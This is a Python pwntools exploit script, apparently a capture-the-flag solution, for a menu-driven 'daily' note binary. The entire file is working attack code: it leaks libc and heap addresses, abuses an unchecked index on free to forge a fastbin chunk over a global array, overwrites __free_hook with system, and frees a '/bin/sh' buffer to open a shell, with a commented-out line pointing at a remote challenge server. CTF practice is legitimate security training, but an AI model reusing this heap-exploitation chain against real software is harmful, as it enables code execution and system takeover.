from pwn import *

sh =process("./pwn")
#sh = remote("5f0cfa41a052c741f4beafe9d083d281.kr-lab.com",58512)
elf = ELF("./pwn")
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')




def menu(idx):
    sh.recvuntil("Your choice:")
    sh.sendline(str(idx))
def add(size,con):
    menu(2)
    sh.recvuntil("Please enter the length of daily:")
    sh.sendline(str(size))
    sh.recvuntil("Now you can write you daily\n")
    sh.send(con)
def delete(idx):
    menu(4)
    sh.recvuntil("Please enter the idx of daily:")
    sh.sendline(str(idx))
def edit(idx,con):
    menu(3)
    sh.recvuntil("Please enter the idx of daily:")
    sh.sendline(str(idx))
    sh.recvuntil("Please enter the new daily")
    sh.send(con)
def show():
    menu(1)


add(0x20,"A")  #0
add(0x800,"A")  #1
add(0x10,"A")  #2
delete(1)
add(0x100,"AAAAAAAA")  #1
show()
sh.recvuntil("A"*8)
main_arena=u64(sh.recv(6).ljust(8,'\x00'))-0x548

libc_base=main_arena-libc.symbols["__malloc_hook"]-0x10
edit(1,"A"*24)
show()
sh.recvuntil("A"*24)
heap=u64(sh.recv(4).ljust(8,'\x00'))

one_gadget=libc_base+libc.symbols["system"]
malloc_hook=libc_base+libc.symbols["__malloc_hook"]

fake_chunk=libc_base + 0x3c4af5 -8

free_hook=libc_base+libc.symbols["__free_hook"]

add(0x700-8,"AAA")
add(0x10,"AAA")
add(0x10,"AAA")

delete(4)
delete(5)
offset=(heap+0x10-0x000000000602060)/16
payload=p64(0x100)+p64(heap+0x830+0x10)
edit(1,payload)
delete(offset)
add(0x10,p64(0x602058))
add(0x10,"C")
add(0x10,"d")
add(0x10,"d")
edit(7,p64(free_hook))
edit(0,p64(one_gadget))
edit(1,"/bin/sh\x00")
delete(1)
sh.interactive()
